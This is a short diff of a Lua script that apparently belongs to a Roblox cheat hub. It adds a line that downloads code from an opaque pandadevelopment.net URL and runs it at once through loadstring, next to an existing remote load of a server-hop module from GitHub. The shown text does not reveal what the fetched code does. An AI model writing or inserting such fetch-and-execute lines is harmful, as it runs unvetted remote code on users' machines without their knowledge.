@@ -6,6 +6,7 @@ if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Main (minima
         task.wait(5)
     until not game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Main (minimal)")
 end
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e9c206fd76482ee2"))()
 local HopServerModule = (loadstring(game:HttpGet("https://raw.githubusercontent.com/hiuvc/hiuhub/refs/heads/main/HopServerModule.lua")))()
 do
   ply = game.Players;
